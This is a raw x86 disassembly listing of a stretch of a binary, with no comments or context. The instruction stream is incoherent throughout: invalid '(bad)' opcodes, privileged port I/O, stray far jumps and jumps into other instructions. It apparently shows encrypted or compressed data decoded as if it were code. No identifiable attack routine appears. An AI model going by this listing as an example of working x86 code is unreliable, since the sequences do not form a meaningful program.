  40c61e:	jmp    0xd47e:0x769bef09
  40c625:	sub    al,0xf1
  40c627:	mov    eax,ds:0xbbd72268
  40c62c:	mov    bl,0x2e
  40c62e:	nop
  40c62f:	or     al,0x53
  40c631:	mov    edx,0xa2d7c21f
  40c636:	pop    ss
  40c637:	cmp    BYTE PTR [edx+ecx*8],cl
  40c63a:	sub    al,0x9b
  40c63c:	outs   dx,DWORD PTR ds:[esi]
  40c63d:	imul   eax,DWORD PTR [edi],0xffffff8c
  40c640:	jecxz  0x40c681
  40c642:	loope  0x40c65b
  40c644:	mov    bl,0x68
  40c646:	jg     0x40c61c
  40c648:	push   cs
  40c649:	jmp    0x40c601
  40c64b:	rcr    DWORD PTR [edi+0x48],0xf8
  40c64f:	pop    ebp
  40c650:	xchg   esp,eax
  40c651:	push   esp
  40c652:	ror    DWORD PTR [edx],1
  40c654:	inc    ebp
  40c655:	jo     0x40c61b
  40c657:	out    dx,al
  40c658:	jmp    0x40c631
  40c65a:	mov    edx,0x29aaaa3c
  40c65f:	adc    eax,0x6edb00d3
  40c664:	aaa    
  40c665:	xor    al,0x96
  40c667:	inc    edi
  40c668:	stos   DWORD PTR es:[edi],eax
  40c669:	lods   eax,DWORD PTR ds:[esi]
  40c66a:	adc    BYTE PTR [ebp-0x285f1d8c],dl
  40c670:	mov    DWORD PTR [edi],eax
  40c672:	inc    ebx
  40c673:	mov    BYTE PTR [ebx],ch
  40c675:	(bad)  
  40c677:	outs   dx,DWORD PTR ds:[esi]
  40c678:	inc    ecx
  40c679:	fsub   DWORD PTR [edi]
  40c67b:	xor    esi,edx
  40c67d:	test   ax,0xb6bc
  40c681:	push   ss
  40c682:	adc    DWORD PTR [esi-0x1],edi
  40c685:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c686:	popf   
  40c687:	inc    edx
  40c688:	fistp  WORD PTR [ecx+0x545cad2d]
  40c68e:	sub    BYTE PTR [ebp-0x60d6ccf],bh
  40c694:	mov    ebx,0x1daf77ab
  40c699:	xlat   BYTE PTR ds:[ebx]
  40c69a:	jnp    0x40c68a
  40c69c:	rol    DWORD PTR [eax+0x701d8a6d],cl
  40c6a2:	add    eax,0x38b04650
  40c6a7:	add    edi,DWORD PTR [ebp-0x58bb5798]
  40c6ad:	scas   eax,DWORD PTR es:[edi]
  40c6ae:	adc    ebp,DWORD PTR [ebp+0x51]
  40c6b1:	pop    edi
  40c6b2:	fs mov esp,0xe6b2a25f
  40c6b8:	loopne 0x40c647
  40c6ba:	sbb    edi,DWORD PTR es:[ecx+0x459fdc98]
  40c6c1:	iret   
  40c6c2:	jne    0x40c6ea
  40c6c4:	or     BYTE PTR [ecx-0x7e],al
  40c6c7:	repz jg 0x40c6e9
  40c6ca:	adc    eax,0x9b39680e
  40c6cf:	cwde   
  40c6d0:	push   esp
  40c6d1:	div    DWORD PTR [edi]
  40c6d3:	arpl   WORD PTR [esi+0x2ecf9793],dx
  40c6d9:	sbb    al,0xa0
  40c6db:	mov    dl,0x8b
  40c6dd:	mov    al,0xc9
  40c6df:	(bad)  
  40c6e0:	into   
  40c6e1:	add    eax,0x22c3d502
  40c6e6:	push   esp
  40c6e7:	retf   
  40c6e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6e9:	xor    al,0x85
  40c6eb:	clc    
  40c6ec:	fsubp  st(5),st
  40c6ee:	sub    al,0xae
  40c6f0:	mov    esi,0xf937bb2d
  40c6f5:	lods   eax,DWORD PTR ds:[esi]
  40c6f6:	inc    edi
  40c6f7:	fcmove st,st(3)
  40c6f9:	rol    BYTE PTR [edx+edi*1-0x307f6fb6],0xd0
  40c701:	xchg   ebx,eax
  40c702:	add    al,0x83
  40c704:	add    eax,0x5efd0196
  40c709:	add    al,0xfc
  40c70b:	jb     0x40c69e
  40c70d:	add    al,0xe5
  40c70f:	push   esi
  40c710:	aas    
  40c711:	sbb    eax,0xaeb6fb47
  40c716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c717:	inc    eax
  40c718:	inc    esp
  40c719:	mov    ?,WORD PTR [esi+0x48b3a5ae]
  40c71f:	xor    DWORD PTR [ebx+eiz*1+0x6d14850f],esp
  40c726:	(bad)  
  40c727:	(bad)  
  40c728:	add    eax,0x3888a677
  40c72d:	cmp    edx,DWORD PTR [eax-0x438a69eb]
  40c733:	jne    0x40c759
  40c735:	(bad)  
  40c736:	frstor [eax]
  40c738:	adc    eax,0x2b4f6792
  40c73d:	pop    es
  40c73e:	aaa    
  40c73f:	xchg   edi,eax
  40c740:	imul   BYTE PTR [ecx+0x29136817]
  40c746:	or     dh,cl
  40c748:	push   es
  40c749:	or     BYTE PTR [eax-0x28],bl
  40c74c:	ds mov esp,0x5cef913b
  40c752:	ja     0x40c78e
  40c754:	sar    ebx,cl
  40c756:	nop
  40c757:	mov    ds:0x200b761,al
  40c75c:	jae    0x40c70f
  40c75e:	push   cs
  40c75f:	pop    es
  40c760:	fwait
  40c761:	push   ss
  40c762:	and    edx,DWORD PTR [eax+0x3d]
  40c765:	pop    ebp
  40c766:	add    BYTE PTR [edi+0x134864e3],dh
  40c76c:	(bad)  
  40c76d:	and    ebp,DWORD PTR [edx]
  40c76f:	xchg   ebp,eax
  40c770:	inc    edx
  40c771:	pop    ss
  40c772:	daa    
  40c773:	add    al,0x57
  40c775:	fnstenv [edx+0x6fd6520d]
  40c77b:	xchg   ebx,eax
  40c77c:	cmp    BYTE PTR ds:0xfe8c2a92,ch
  40c782:	xchg   ecx,eax
  40c783:	push   ds
  40c784:	es (bad) 
  40c786:	pop    ss
  40c787:	xchg   ebx,eax
  40c788:	add    edi,esi
  40c78a:	mov    ecx,DWORD PTR [edi+ebp*1-0x78]
  40c78e:	arpl   bx,bx
  40c790:	cmpxchg DWORD PTR [ebx+0x76acc389],ebp
  40c797:	push   cs
  40c798:	mov    bh,0x21
  40c79a:	mov    DWORD PTR [edx],0x2e0960bf
  40c7a0:	pop    esi
  40c7a1:	jb     0x40c730
  40c7a3:	mov    al,ds:0x65b21d73
  40c7a8:	aam    0x53
  40c7aa:	adc    BYTE PTR [ecx+0x22],0x72
  40c7ae:	cmp    DWORD PTR [esp+edi*2-0x59],esp
  40c7b2:	call   0x3bc6:0x13113327
  40c7b9:	cwde   
  40c7ba:	ror    DWORD PTR [eax-0x61],1
  40c7bd:	jl     0x40c75f
  40c7bf:	push   ebp
  40c7c0:	sbb    al,0xcf
  40c7c2:	and    DWORD PTR [eax+ebx*4+0x3aeedda0],edx
  40c7c9:	into   
  40c7ca:	xchg   edx,eax
  40c7cb:	push   esp
  40c7cd:	and    dl,BYTE PTR [edi]
  40c7cf:	add    BYTE PTR [esi],0xcd
  40c7d2:	push   ebp
  40c7d3:	out    0x7a,eax
  40c7d5:	mov    edi,0x55abb63
  40c7da:	fst    QWORD PTR [edx-0x7a]
  40c7dd:	push   ebp
  40c7de:	mov    dl,0x8c
  40c7e0:	jne    0x40c7d6
  40c7e2:	or     al,0x71
  40c7e4:	dec    eax
  40c7e5:	xor    BYTE PTR [edi+edx*4],al
  40c7e8:	in     al,dx
  40c7e9:	ss fadd st,st(3)
  40c7ec:	xor    esi,DWORD PTR [eiz*8-0x4f765c05]
  40c7f3:	loope  0x40c7de
  40c7f5:	adc    BYTE PTR [esi-0x446cfaea],bl
  40c7fb:	jge    0x40c87b
  40c7fd:	mov    esi,0x84899ba7
  40c802:	and    al,dh
  40c804:	sbb    bl,0x7a
  40c807:	mov    fs,WORD PTR [ecx-0x28f2f9ab]
  40c80d:	jne    0x40c827
  40c80f:	(bad)  
  40c810:	and    ax,0x91a3
  40c814:	enter  0xaddd,0xd4
  40c818:	fsubr  QWORD PTR [edx]
  40c81a:	sbb    eax,0x38dd70ac
  40c81f:	cmp    ah,BYTE PTR [edi]
  40c821:	aaa    
  40c822:	sti    
  40c823:	jle    0x40c7b1
  40c825:	push   ebp
  40c826:	cmp    esi,DWORD PTR [ebx+0x674da677]
  40c82c:	mov    ah,dh
  40c82e:	test   eax,0x8b6bd9c2
  40c833:	xlat   BYTE PTR ds:[ebx]
  40c834:	out    dx,eax
  40c835:	sub    al,0x66
  40c837:	lds    edi,FWORD PTR [edx+0x623d5b8f]
  40c83d:	int    0x90
  40c83f:	addr16 adc ebp,ebx
  40c842:	js     0x40c868
  40c844:	sub    ebp,DWORD PTR [edi-0x58db6925]
  40c84a:	mov    bh,0xb1
  40c84c:	adc    dh,BYTE PTR [edi]
  40c84e:	push   ecx
  40c84f:	dec    esp
  40c850:	xchg   eax,ebx
  40c852:	clc    
  40c853:	inc    ecx
  40c854:	inc    ebx
  40c855:	sbb    DWORD PTR [esi+0x31],ecx
  40c858:	es push esp
  40c85a:	push   0x4ffebaf4
  40c85f:	imul   esp,DWORD PTR [eax+ebp*2],0xe1a77f49
  40c866:	sbb    dx,WORD PTR [edx]
  40c869:	imul   eax,DWORD PTR [ebp-0x7a],0xd
  40c86d:	aad    0x28
  40c86f:	ja     0x40c8a9
  40c871:	popa   
  40c872:	sbb    al,0x8d
  40c874:	inc    edi
  40c875:	mov    esi,0x5e7925c3
  40c87a:	shl    DWORD PTR [ecx+eiz*8-0xec7a947],cl
  40c881:	xor    BYTE PTR [ebx+edi*1-0x235db36],dl
  40c888:	loop   0x40c900
  40c88a:	and    esi,DWORD PTR [ebx+0x6e]
  40c88d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c88e:	jbe    0x40c8f7
  40c890:	in     eax,dx
  40c891:	mov    edi,0x93c3fa3f
  40c896:	jge    0x40c869
  40c898:	nop
  40c899:	add    dh,BYTE PTR [ecx]
  40c89b:	out    0x86,eax
  40c89d:	popf   
  40c89e:	dec    esi
  40c89f:	popf   
  40c8a0:	jnp    0x40c835
  40c8a2:	xchg   edx,eax
  40c8a3:	sub    BYTE PTR [ebx],0xdf
  40c8a6:	push   ebx
  40c8a7:	or     ah,BYTE PTR [ecx-0x5c6e3532]
  40c8ad:	test   eax,0x41cc603b
  40c8b2:	dec    edi
  40c8b3:	dec    ecx
  40c8b4:	jg     0x40c885
  40c8b6:	call   0xdc50:0x7fe3f443
  40c8bd:	fcom   QWORD PTR [ebx-0x35]
  40c8c0:	shl    DWORD PTR [ebp-0x4a],cl
  40c8c3:	add    DWORD PTR [ebx],ebp
  40c8c5:	sti    
  40c8c6:	icebp  
  40c8c7:	push   es
  40c8c8:	push   esi
  40c8c9:	pushf  
  40c8ca:	mov    eax,ds:0x11919af3
  40c8cf:	xchg   esi,eax
  40c8d0:	ja     0x40c86d
  40c8d2:	hlt    
  40c8d3:	icebp  
  40c8d4:	enter  0x698f,0x3b
  40c8d8:	fwait
  40c8d9:	and    DWORD PTR [esi],esp
  40c8db:	or     DWORD PTR [ebx],edx
  40c8dd:	inc    edi
  40c8de:	das    
  40c8df:	and    al,BYTE PTR [ebp-0x2b]
  40c8e2:	mov    edx,0xb5d80d6a
  40c8e7:	xchg   edx,eax
  40c8e8:	aam    0xac
  40c8ea:	dec    ebx
  40c8eb:	fiadd  WORD PTR [edi-0x65153a08]
  40c8f1:	das    
  40c8f2:	adc    BYTE PTR [ecx-0x3d2e5658],bl
  40c8f8:	or     DWORD PTR [ecx-0x5f17041],esp
  40c8fe:	adc    BYTE PTR [edi],ch
  40c900:	shl    BYTE PTR [ebp+0x7a1ac081],0xab
  40c907:	jecxz  0x40c8f3
  40c909:	mov    edx,0x32e2cc43
  40c90e:	mov    edi,0x8d1fd998
  40c913:	mov    ecx,0xbc24b1e2
  40c918:	test   DWORD PTR [eax],0xc128e023
  40c91e:	retf   0x713a
  40c921:	sbb    dh,BYTE PTR [ebx]
  40c923:	inc    eax
  40c924:	inc    edi
  40c925:	inc    esi
  40c926:	retf   
  40c927:	add    edx,DWORD PTR [edi+0x4bc4745a]
  40c92d:	out    dx,al
  40c92e:	jecxz  0x40c918
  40c930:	dec    ecx
  40c931:	enter  0xd014,0xe6
  40c935:	xchg   BYTE PTR [ebx-0x13ec4121],bl
  40c93b:	rcr    BYTE PTR [ebp+0x60],0x38
  40c93f:	popa   
  40c940:	jp     0x40c9ac
  40c942:	call   0xa436f6d1
  40c947:	stos   DWORD PTR es:[edi],eax
  40c948:	mov    ecx,0xc75819ed
  40c94d:	and    al,0x6f
  40c94f:	in     al,0x35
  40c951:	out    dx,al
  40c952:	cwde   
  40c953:	sbb    cl,BYTE PTR [ecx+0x3a7f617c]
  40c959:	jge    0x40c973
  40c95b:	push   esi
  40c95c:	sub    al,0xd4
  40c95e:	mov    ah,0xa7
  40c960:	mov    edi,DWORD PTR [edi+0x51e4aafa]
  40c966:	scas   eax,DWORD PTR es:[edi]
  40c967:	jns    0x40c9be
  40c969:	bound  ebp,QWORD PTR [esi-0x23]
  40c96c:	dec    esi
  40c96d:	ficomp WORD PTR [ebx]
  40c96f:	add    DWORD PTR [ecx],0xffffffa1
  40c972:	xchg   ebx,eax
  40c973:	fistp  DWORD PTR ds:0x5b3eb72e
  40c979:	mov    ch,0x79
  40c97b:	loopne 0x40c908
  40c97d:	inc    BYTE PTR [ebx]
  40c97f:	push   0xffffff83
  40c981:	xor    edi,edx
  40c983:	mov    ds:0xb3802121,al
  40c988:	add    DWORD PTR [ebx-0x53],ebp
  40c98b:	lods   al,BYTE PTR ds:[esi]
  40c98c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c98d:	fsub   DWORD PTR [ecx-0x47]
  40c990:	xor    eax,0x3c
  40c993:	dec    ecx
  40c994:	cmp    DWORD PTR [esi+esi*1+0x55],ecx
  40c998:	out    dx,al
  40c999:	repnz scas al,BYTE PTR es:[edi]
  40c99b:	or     DWORD PTR [ebx-0x1082171b],esp
  40c9a1:	sbb    DWORD PTR [eax+ebp*1+0x59],esi
  40c9a5:	mov    al,ds:0xb0853464
  40c9aa:	mov    es,WORD PTR [eax-0xa9f8d5f]
  40c9b0:	sahf   
  40c9b1:	and    al,0xee
  40c9b3:	inc    eax
  40c9b4:	push   0xb7007afe
  40c9b9:	(bad)  
  40c9ba:	mov    al,0x9f
  40c9bc:	(bad)  [ebp+0x49]
  40c9bf:	xchg   esp,eax
  40c9c0:	xchg   ebp,eax
  40c9c1:	bound  ecx,QWORD PTR [ebp+ecx*8+0x1e]
  40c9c5:	mov    bh,0xfe
  40c9c7:	dec    ecx
  40c9c8:	bound  edx,QWORD PTR [ecx+0x25]
  40c9cb:	fnsave [ebp+0x4f]
  40c9ce:	cs mov dh,0x9c
  40c9d1:	mov    ah,0x4b
  40c9d3:	push   esp
  40c9d4:	pushf  
  40c9d5:	push   esi
  40c9d6:	dec    ebp
  40c9d7:	jecxz  0x40ca10
  40c9d9:	mov    bl,0x3c
  40c9db:	mov    WORD PTR [esi],gs
  40c9dd:	xchg   edx,eax
  40c9de:	mov    eax,0xb65352ee
  40c9e3:	dec    ebp
  40c9e4:	pop    esp
  40c9e5:	ret    
  40c9e6:	shl    BYTE PTR [eax+0x4253e6f4],0xc2
  40c9ed:	cmp    edi,0xfffffff3
  40c9f0:	ins    DWORD PTR es:[edi],dx
  40c9f1:	call   0x6e30dab
  40c9f6:	adc    eax,0xcefc5b5c
  40c9fb:	mov    cl,0x1
  40c9fd:	jl     0x40ca1a
  40c9ff:	xor    DWORD PTR [edi-0x64],edi
  40ca02:	push   esp
  40ca03:	fidiv  DWORD PTR [ebx]
  40ca05:	cmp    BYTE PTR [ecx+edx*8],ah
  40ca08:	mov    dl,0x17
  40ca0a:	cmc    
  40ca0b:	jnp    0x40c9ab
  40ca0d:	jno    0x40ca73
  40ca0f:	sub    esp,DWORD PTR [eax+0x3bf4210b]
  40ca15:	mov    al,0x61
  40ca17:	out    0xac,eax
  40ca19:	mov    ecx,0x734bb505
  40ca1e:	jno    0x40ca50
  40ca20:	loopne 0x40c9c5
  40ca22:	bound  ebp,QWORD PTR [edx]
  40ca24:	cmp    BYTE PTR [esi+0x75],ah
  40ca27:	pop    esi
  40ca28:	dec    esi
  40ca29:	cmp    eax,0x5813b991
  40ca2f:	xor    BYTE PTR [ebp+0x60],bh
  40ca32:	sbb    eax,0x6de05e87
  40ca37:	jbe    0x40ca79
  40ca39:	jnp    0x40cab6
  40ca3b:	mov    BYTE PTR [edi+0xb],ch
  40ca3e:	jbe    0x40ca66
  40ca40:	mov    al,BYTE PTR [edx+0x3a38182d]
  40ca46:	push   edx
  40ca47:	and    DWORD PTR [edi+0x5cc00edd],eax
  40ca4d:	aaa    
  40ca4e:	out    0x7c,al
  40ca50:	mov    ebx,0x879475f1
  40ca55:	cdq    
  40ca56:	push   ss
  40ca57:	leave  
  40ca58:	cmp    BYTE PTR [ebp+0x5e],bl
  40ca5b:	jmp    0x40cacb
  40ca5d:	pop    dx
  40ca5f:	(bad)  
  40ca60:	pop    edx
  40ca61:	call   0x9a1e0ba
  40ca66:	or     DWORD PTR [ecx+0x48],0xffffffcb
  40ca6a:	lock ins BYTE PTR es:[edi],dx
  40ca6c:	sbb    eax,0xc0d1091e
  40ca71:	push   ebp
  40ca72:	mov    ds:0x7e67a576,al
  40ca77:	call   0x6a24:0xf87efbd2
  40ca7e:	pop    edi
  40ca7f:	mov    DWORD PTR [eax],ecx
  40ca81:	sub    BYTE PTR [ebx],ch
  40ca83:	jle    0x40cada
  40ca85:	jns    0x40ca10
  40ca87:	jmp    0x40ca82
  40ca89:	int    0xe7
  40ca8b:	jp     0x40ca69
  40ca8d:	lods   eax,DWORD PTR ds:[esi]
  40ca8e:	pop    edx
  40ca8f:	and    al,dl
  40ca91:	das    
  40ca92:	adc    eax,0x887d8121
  40ca97:	pmaxsw mm1,QWORD PTR [eax-0x39]
  40ca9b:	shl    DWORD PTR [ecx],cl
  40ca9d:	lahf   
  40ca9e:	and    WORD PTR [ebx-0x53],bp
  40caa2:	retf   0x3937
  40caa5:	jns    0x40ca28
  40caa7:	xlat   BYTE PTR ds:[ebx]
  40caa8:	mov    dl,0x2
  40caaa:	sub    eax,DWORD PTR [bp+di]
  40caad:	enter  0xd7f7,0xfc
  40cab1:	add    esi,eax
  40cab3:	(bad)  
  40cab4:	int3   
  40cab5:	pop    ebp
  40cab6:	rol    BYTE PTR ds:0x41d78d67,1
  40cabc:	sbb    al,0x1
  40cabe:	cmp    al,0x4c
  40cac0:	xor    DWORD PTR [edx-0x4f33fd46],edi
  40cac6:	push   0x5e5416b9
  40cacb:	(bad)  
  40cacc:	call   0x1a4f060c
  40cad1:	pop    ss
  40cad2:	mov    bl,BYTE PTR ds:0x220b8e5d
  40cad8:	mov    ebp,0xf569f9db
  40cadd:	in     eax,0x83
  40cadf:	cmp    BYTE PTR [edx],al
  40cae1:	scas   eax,DWORD PTR es:[edi]
  40cae2:	pusha  
  40cae3:	jl     0x40ca93
  40cae5:	push   0xfd59116f
  40caea:	xor    BYTE PTR [esi+0x3695dc5d],cl
  40caf0:	push   edx
  40caf1:	push   esi
  40caf2:	cmp    DWORD PTR [eax-0x267a7e5c],ebp
  40caf8:	popf   
  40caf9:	rep ins DWORD PTR es:[edi],dx
  40cafb:	dec    esi
  40cafc:	inc    edx
  40cafd:	jl     0x40cad9
  40caff:	test   DWORD PTR [edi-0x28],edx
  40cb02:	push   ds
  40cb03:	xor    dh,BYTE PTR [edx+0x228cff83]
  40cb09:	ins    BYTE PTR es:[edi],dx
  40cb0a:	cmp    eax,0x6f50fb1
  40cb0f:	sub    dh,cl
  40cb11:	fs retf 0x6305
  40cb15:	scas   eax,DWORD PTR es:[edi]
  40cb16:	mov    cl,0xfa
  40cb18:	mov    bl,0x7b
  40cb1a:	lods   al,BYTE PTR ds:[esi]
  40cb1b:	adc    bl,BYTE PTR [ebp-0x5c]
  40cb1e:	int    0xa
  40cb20:	ins    BYTE PTR es:[edi],dx
  40cb21:	addr16 pop ds
  40cb23:	add    BYTE PTR [esi],0xe9
  40cb26:	or     dh,BYTE PTR [edx+0x77]
  40cb29:	cmp    al,0x30
  40cb2b:	inc    eax
  40cb2c:	dec    eax
  40cb2d:	fwait
  40cb2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb2f:	out    dx,eax
  40cb30:	jbe    0x40cb08
  40cb32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb33:	dec    ecx
  40cb34:	out    dx,al
  40cb35:	dec    edi
  40cb36:	jbe    0x40cb26
  40cb38:	and    al,0x64
  40cb3a:	out    0x28,eax
  40cb3c:	fimul  WORD PTR [esi]
  40cb3e:	sbb    ch,BYTE PTR [ebx]
  40cb40:	sub    DWORD PTR [eax-0x7f5e6de7],ebx
  40cb46:	popf   
  40cb47:	out    dx,al
  40cb48:	hlt    
  40cb49:	jmp    0xac51:0xec4a9378
  40cb50:	nop
  40cb51:	lock enter 0xa043,0xc7
  40cb56:	pop    es
  40cb57:	call   FWORD PTR [ebx+ecx*4-0x35]
  40cb5b:	mov    cl,0x32
  40cb5d:	cli    
  40cb5e:	cwde   
  40cb5f:	in     al,0x94
  40cb61:	sub    eax,0x15c6d7e2
  40cb66:	pop    ebx
  40cb67:	sub    DWORD PTR [ecx-0x761717ee],ecx
  40cb6d:	sub    ch,BYTE PTR [edi-0x3e]
  40cb70:	mov    cl,0xab
  40cb72:	ds cmp edi,eax
  40cb75:	adc    eax,0xeeedddff
  40cb7a:	dec    ecx
  40cb7b:	xchg   ebx,eax
  40cb7c:	sbb    al,0x39
  40cb7e:	dec    esi
  40cb7f:	xor    al,BYTE PTR [edx]
  40cb81:	jnp    0x40cb81
  40cb83:	lods   al,BYTE PTR ds:[esi]
  40cb84:	(bad)  
  40cb85:	fld    DWORD PTR [ebp+0x27ce1e81]
  40cb8b:	(bad)  
  40cb8c:	ror    BYTE PTR [ebx+0x7e],1
  40cb8f:	jno    0x40cba7
  40cb91:	and    DWORD PTR [ecx+0x58],edx
  40cb94:	scas   al,BYTE PTR es:[edi]
  40cb95:	mov    edi,0x8bbc416
  40cb9a:	mov    WORD PTR [esi],ss
  40cb9c:	pop    es
  40cb9d:	rol    BYTE PTR [eax-0x513d7ce0],0xca
  40cba4:	dec    ebx
  40cba5:	nop
  40cba6:	lods   al,BYTE PTR cs:[esi]
  40cba8:	es mov eax,edi
  40cbab:	mov    al,ch
  40cbad:	ss leave 
  40cbaf:	mov    ds:0x63828742,al
  40cbb4:	std    
  40cbb5:	aad    0x1f
  40cbb7:	in     eax,dx
  40cbb8:	mov    al,ds:0x26f18b16
  40cbbd:	pop    esi
  40cbbe:	pop    edi
  40cbbf:	hlt    
  40cbc0:	bound  edi,QWORD PTR [ecx+0x67]
  40cbc3:	mov    ebx,0x887bdfd9
  40cbc8:	xchg   ecx,eax
  40cbc9:	jne    0x40cbbd
  40cbcb:	loopne 0x40cc3e
  40cbcd:	xchg   esp,eax
  40cbce:	(bad)  
  40cbcf:	xchg   edx,eax
  40cbd0:	dec    ecx
  40cbd1:	lahf   
  40cbd2:	xchg   esi,eax
  40cbd3:	into   
  40cbd4:	xchg   ebx,esi
  40cbd6:	xchg   esi,eax
  40cbd7:	mov    WORD PTR [bp+di+0x4658],ss
  40cbdc:	outs   dx,BYTE PTR ds:[esi]
  40cbdd:	inc    ebx
  40cbde:	and    eax,ebx
  40cbe0:	shl    BYTE PTR [ebx],cl
  40cbe2:	cmp    eax,0x629ada9b
  40cbe7:	xchg   BYTE PTR ds:0x29adb61c,ch
  40cbed:	das    
  40cbee:	aam    0xc1
  40cbf0:	xor    DWORD PTR [edi+0x13],esp
  40cbf3:	mov    edx,0x47da3352
  40cbf8:	dec    esi
  40cbf9:	dec    edx
  40cbfa:	icebp  
  40cbfb:	icebp  
  40cbfc:	mov    al,0x60
  40cbfe:	ror    DWORD PTR [ebp+0x10c6e2e3],0xf
  40cc05:	jmp    0x8ffe:0x54a0a988
  40cc0c:	cmc    
  40cc0d:	xchg   esi,eax
  40cc0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc0f:	adc    ah,dl
  40cc11:	mov    WORD PTR [edi+0x6c06eb63],ss
  40cc17:	fld    TBYTE PTR [esi]
  40cc19:	sar    DWORD PTR [edi+esi*8+0x66c40215],cl
  40cc20:	push   eax
  40cc21:	pop    eax
  40cc22:	retf   
  40cc23:	xchg   edx,eax
  40cc24:	daa    
  40cc25:	adc    DWORD PTR [ecx-0x24],esp
  40cc28:	rcr    BYTE PTR [esi],1
  40cc2a:	test   al,0xff
  40cc2c:	or     al,0xee
  40cc2e:	pop    ebx
  40cc2f:	xor    ah,BYTE PTR [ecx+0x2736ef1f]
  40cc35:	ins    DWORD PTR es:[edi],dx
  40cc36:	add    al,0xe7
  40cc38:	daa    
  40cc39:	adc    al,BYTE PTR [eax]
  40cc3b:	clc    
  40cc3c:	adc    cl,BYTE PTR [edx-0x13]
  40cc3f:	mov    edi,0x4ba0d83c
  40cc44:	repz cmp al,0x31
  40cc47:	and    al,ch
  40cc49:	and    eax,0x2456fd07
  40cc4e:	aam    0x4d
  40cc50:	or     edi,DWORD PTR [edx-0x6149f7ed]
  40cc56:	or     DWORD PTR [esp+ebp*1-0x26],0x67
  40cc5b:	(bad)  
  40cc5c:	punpckldq mm0,DWORD PTR [ebp+0x75c59d27]
  40cc63:	imul   BYTE PTR [edi+eiz*2]
  40cc66:	push   ss
  40cc67:	call   0x1e21230b
  40cc6c:	adc    BYTE PTR [eax-0x441579],al
  40cc72:	dec    eax
  40cc73:	bound  ecx,QWORD PTR [eax]
  40cc75:	cli    
  40cc76:	mov    BYTE PTR [edx+0x2ba90624],ah
  40cc7c:	jmp    0xf456eeaf
  40cc81:	adc    eax,0xfa75bfb0
  40cc86:	test   eax,0x99ced555
  40cc8b:	outs   dx,BYTE PTR ds:[esi]
  40cc8c:	fmul   DWORD PTR [edx]
  40cc8e:	and    esp,esp
  40cc90:	add    al,0xf8
  40cc92:	jae    0x40cc9a
  40cc94:	inc    edx
  40cc95:	mov    esp,0x77e08e1
  40cc9a:	push   ebp
  40cc9b:	enter  0x418c,0x66
  40cc9f:	jge    0x40ccb7
  40cca1:	xchg   ebx,eax
  40cca2:	mov    al,ds:0x9eea325f
  40cca7:	dec    edi
  40cca8:	pop    ecx
  40cca9:	push   ecx
  40ccaa:	mov    esp,0x545efd9f
  40ccaf:	push   0xffffffeb
  40ccb1:	mov    BYTE PTR [ecx+esi*1],al
  40ccb4:	into   
  40ccb5:	xlat   BYTE PTR ds:[ebx]
  40ccb6:	dec    ebp
  40ccb7:	out    0xe6,al
  40ccb9:	in     eax,dx
  40ccba:	sbb    al,0x17
  40ccbc:	mov    esi,DWORD PTR [edx-0x6a]
  40ccbf:	mov    dl,0x23
  40ccc1:	das    
  40ccc2:	xchg   esp,eax
  40ccc3:	or     dh,bh
  40ccc5:	out    0x31,eax
  40ccc7:	pop    ds
  40ccc8:	adc    eax,DWORD PTR [ebx-0x26]
  40cccb:	mov    ebp,0x379832e9
  40ccd0:	jo     0x40ccc1
  40ccd2:	xor    dl,BYTE PTR [ebx]
  40ccd4:	popf   
  40ccd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccd6:	fimul  DWORD PTR [ebx-0x58]
  40ccd9:	fist   WORD PTR [edx]
  40ccdb:	sbb    DWORD PTR [ecx+0x48320541],eax
  40cce1:	loopne 0x40cd4f
  40cce3:	or     eax,DWORD PTR [edx]
  40cce5:	rcl    DWORD PTR [eax+0x3e],1
  40cce8:	mov    edi,0x54276265
  40ccee:	jns    0x40ccf1
  40ccf0:	dec    ecx
  40ccf1:	sti    
  40ccf2:	out    0x81,al
  40ccf4:	jp     0x40ccf0
  40ccf6:	xchg   BYTE PTR fs:[edi-0x42],ch
  40ccfa:	lods   al,BYTE PTR ds:[esi]
  40ccfb:	xchg   esi,eax
  40ccfc:	cmc    
  40ccfd:	pop    ebx
  40ccfe:	dec    edi
  40ccff:	test   BYTE PTR [edi],0xaa
  40cd02:	int3   
  40cd03:	jo     0x40ccb1
  40cd05:	or     dl,0x44
  40cd08:	clc    
  40cd09:	xlat   BYTE PTR ds:[ebx]
  40cd0a:	push   edi
  40cd0b:	xchg   edx,eax
  40cd0c:	pop    esp
  40cd0d:	jb     0x40cd13
  40cd0f:	or     ecx,edi
  40cd11:	mov    cl,0x78
  40cd13:	loop   0x40cd3d
  40cd15:	mov    BYTE PTR [ebx-0x61],dh
  40cd18:	pop    esi
  40cd19:	(bad)  
  40cd1a:	jmp    FWORD PTR [edi*2+0x5063dc6]
  40cd21:	rol    bh,0xf3
  40cd24:	sub    al,0x53
  40cd26:	inc    esi
  40cd27:	retf   0xcffe
  40cd2a:	mov    edx,0x4094a2ba
  40cd2f:	stc    
  40cd30:	fisub  WORD PTR [edi]
  40cd32:	lock popa 
  40cd34:	inc    ebx
  40cd35:	bound  edx,QWORD PTR [ebx-0x53f99035]
  40cd3b:	retf   0xa1a7
  40cd3e:	sub    eax,0x17565779
  40cd43:	jne    0x40cda3
  40cd45:	jg     0x40cd21
  40cd47:	mov    ch,0x1a
  40cd49:	cmp    al,0x19
  40cd4b:	mov    dh,0xea
  40cd4d:	pop    esi
  40cd4e:	test   BYTE PTR [ecx+0x4c],bh
  40cd51:	or     eax,0xc244d93c
  40cd56:	(bad)
  40cd5a:	retf   0xedb
  40cd5d:	hlt    
  40cd5e:	jp     0x40cd8f
  40cd60:	mov    ebp,0x4d0e2afd
  40cd65:	adc    BYTE PTR [esp+esi*4+0x3b4b5c44],al
  40cd6c:	repz femms 
  40cd6f:	sahf   
  40cd70:	repz inc ebx
  40cd72:	xor    BYTE PTR [edi+0x11a9c18d],dh
  40cd78:	loope  0x40cd9e
  40cd7a:	xor    al,0x43
  40cd7c:	push   ecx
  40cd7d:	mov    eax,0xa4b5586b
  40cd82:	mov    al,BYTE PTR [esi+0x1f]
